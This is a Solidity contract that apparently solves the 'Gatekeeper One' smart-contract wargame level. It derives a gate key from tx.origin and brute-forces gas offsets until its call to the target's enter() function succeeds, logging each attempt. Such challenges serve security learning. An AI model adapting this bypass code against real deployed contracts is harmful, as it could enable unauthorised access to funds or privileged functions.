// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

import "hardhat/console.sol";


interface IGatekeeperOne {
    function enter(bytes8 _gateKey) external returns (bool);
}

contract HackGatekeeperOne {
    address payable private _gateKeeperOneAddress;

    constructor(address gateKeeperOneAddress) payable {
        _gateKeeperOneAddress = payable(gateKeeperOneAddress);
    }

    // 📖 https://docs.soliditylang.org/en/v0.8.15/types.html#members-of-addresses
    // 👉 .gas() - gas limit
    // 👉 .value() - ether amount
    // 👉 return true if succeed - no exceptions are thrown
    function attackUsingNativeEncode() external {
        bytes8 gateKey = bytes8(uint64(uint160(address(tx.origin)))) &
            0xFFFFFFFF0000FFFF;
        bytes memory payload = abi.encodeWithSignature(
            "enter(bytes8)",
            gateKey
        );

        bool attackSuccess = false;
        uint256 additionalGas = 0;
        bytes memory returndata;

        // 🔳 Alternative 1
        while (additionalGas <= 8191 && !attackSuccess) {
            ++additionalGas;

            (attackSuccess, returndata) = _gateKeeperOneAddress.call{
                gas: 100000 * 2 + additionalGas
            }(payload);

            // 🗣 Logging status
            if (returndata.length > 0) {
                console.log("[x] Return data:");
                console.logBytes(returndata);
                console.log("");

                console.log("[x] Return data length:");
                console.log(returndata.length);
                console.log("");
            }
        }

        // 🗣 Logging status
        if (attackSuccess) {
            console.log("[x] Success with gas: ");
            console.log(additionalGas);
        } else {
            console.log("[x] Attack failed");
        }
        console.log("");

    }
}